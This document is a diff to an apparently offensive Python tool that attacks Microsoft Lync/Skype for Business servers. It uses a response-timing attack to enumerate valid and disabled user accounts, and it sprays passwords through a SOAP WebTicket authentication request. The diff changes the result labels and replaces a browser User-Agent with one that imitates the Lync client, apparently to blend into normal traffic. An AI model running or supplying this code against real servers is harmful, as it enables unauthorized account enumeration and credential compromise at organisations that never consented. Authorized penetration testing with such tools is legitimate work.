@@ -168,15 +168,15 @@ def timing_attack(host,userfilepath,password,domain, randomize):
 		 candidatevalue=float(float(response_time)/timeout)
                  if candidatevalue <= float("0.4"):
                      if isDisabled:
-                         status="VALID USER, ACCOUNT DISABLED: {0}, Password: {1} Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
-                         print_good(status)
-                         f.write("[+] {0}\n".format(status))
+                         status="VALID USER (ACCOUNT DISABLED): {0}, Password: {1}, Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
+                         print_error(status)
+                         f.write("[*] {0}\n".format(status))
                      elif validCred:
-                         status="VALID CREDENTIALS: {0}, Password: {1}, Time: {2}".format(user.rstrip(), password.rstrip(),response_time)
+                         status="VALID CREDENTIALS (VALID USER): {0}, Password: {1}, Time: {2}".format(user.rstrip(), password.rstrip(),response_time)
                          print_good(status)
                          f.write("[!] {0}\n".format(status))
                      else:
-                         status="VALID USER: {0}, INVALID PASSWORD: {1}, Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
+                         status="VALID USER (INVALID PASSWORD): {0}, Password: {1}, Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
                          print_good(status)
                          f.write("[+] {}\n".format(status))
                  else:
@@ -229,7 +229,7 @@ def send_xml(host, domain, user, passwd):
 
         xml_data = "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Header><Security s:mustUnderstand=\"1\" xmlns:u=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\" xmlns=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd\"><UsernameToken><Username>{0}</Username><Password Type=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText\">{1}</Password></UsernameToken></Security></s:Header><s:Body><RequestSecurityToken xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" Context=\"ec86f904-154f-0597-3dee-59eb1b51e731\" xmlns=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\"><TokenType>urn:component:Microsoft.Rtc.WebAuthentication.2010:user-cwt-1</TokenType><RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</RequestType><AppliesTo xmlns=\"http://schemas.xmlsoap.org/ws/2004/09/policy\"><EndpointReference xmlns=\"http://www.w3.org/2005/08/addressing\"><Address>https://2013-lync-fe.contoso.com/WebTicket/WebTicketService.svc/Auth</Address></EndpointReference></AppliesTo><Lifetime><Created xmlns=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\">2016-06-07T02:23:36Z</Created><Expires xmlns=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\">2016-06-07T02:38:36Z</Expires></Lifetime><KeyType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/SymmetricKey</KeyType></RequestSecurityToken></s:Body></s:Envelope>".format(encoded_username,encoded_password)
 
-        headers = {'Content-Type': 'text/xml; charset=utf-8','User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0'}
+        headers = {'Content-Type': 'text/xml; charset=utf-8','User-Agent': 'UCCAPI/16.0.13328.20130 OC/16.0.13426.20234'}
         try:
                 #print xml_data
                 lync_url = "https://{0}/WebTicket/WebTicketService.svc/Auth".format(host)
